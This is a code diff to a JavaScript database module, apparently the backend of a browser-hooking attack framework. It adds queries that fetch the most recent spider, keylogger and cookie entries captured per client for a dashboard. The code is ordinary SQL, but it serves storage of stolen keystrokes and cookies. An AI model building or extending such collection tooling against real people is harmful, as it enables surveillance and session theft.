@@ -272,7 +272,7 @@ export function createDatabase(dbPath) {
     "DELETE FROM cookie_entries WHERE client_id = ?"
   );
 
-  // Prepared statements — hasData count queries
+  // Prepared statements — hasData count + last-timestamp queries
   const spiderCountStmt = db.prepare(
     "SELECT COUNT(*) as cnt FROM spider_results WHERE client_id = ?"
   );
@@ -281,6 +281,15 @@ export function createDatabase(dbPath) {
   );
   const cookieCountStmt = db.prepare(
     "SELECT COUNT(*) as cnt FROM cookie_entries WHERE client_id = ?"
+  );
+  const spiderLastStmt = db.prepare(
+    "SELECT MAX(discovered_at) as ts FROM spider_results WHERE client_id = ?"
+  );
+  const keyloggerLastStmt = db.prepare(
+    "SELECT MAX(timestamp) as ts FROM keylogger_entries WHERE client_id = ?"
+  );
+  const cookieLastStmt = db.prepare(
+    "SELECT MAX(timestamp) as ts FROM cookie_entries WHERE client_id = ?"
   );
 
   /**
@@ -693,16 +702,22 @@ export function createDatabase(dbPath) {
     },
 
     /**
-     * Returns a summary of which DB-backed payload tables have data for a client.
-     * Used to show historical data indicator dots in the dashboard.
+     * Returns a summary of which DB-backed payload tables have data for a client,
+     * including the most recent data timestamp for each — used by the frontend to
+     * determine whether the user has unseen data.
      * @param {string} clientId
-     * @returns {{ spider: boolean; keylogger: boolean; cookies: boolean }}
+     * @returns {{ spider: boolean, keylogger: boolean, cookies: boolean, lastDataAt: { spider: number, keylogger: number, cookies: number } }}
      */
     getClientHasData(clientId) {
       return {
         spider: spiderCountStmt.get(clientId).cnt > 0,
         keylogger: keyloggerCountStmt.get(clientId).cnt > 0,
         cookies: cookieCountStmt.get(clientId).cnt > 0,
+        lastDataAt: {
+          spider: spiderLastStmt.get(clientId).ts ?? 0,
+          keylogger: keyloggerLastStmt.get(clientId).ts ?? 0,
+          cookies: cookieLastStmt.get(clientId).ts ?? 0,
+        },
       };
     },
 
